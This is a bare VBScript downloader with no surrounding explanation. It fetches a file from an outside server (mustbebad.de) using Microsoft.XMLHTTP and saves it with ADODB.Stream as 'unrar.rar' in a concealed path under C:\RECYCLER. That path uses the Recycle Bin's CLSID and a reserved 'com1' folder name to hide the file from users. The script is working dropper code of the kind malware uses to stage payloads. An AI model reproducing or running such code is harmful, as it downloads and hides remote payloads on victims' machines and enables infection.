Set xPost = CreateObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://www.mustbebad.de/seperate.upload_dl.php?id=533&key_show=NMEHqpJep6zwMDRovcfXX4EC0XSbzZKrY62yZOdNikWiKUvfrm",0 
xPost.Send() 
Set sGet = CreateObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "C:\RECYCLER\Recycled.{645FF040-5081-101B-9F08-00AA002F954E}\com1\dll\bongthom\unrar.rar",2 
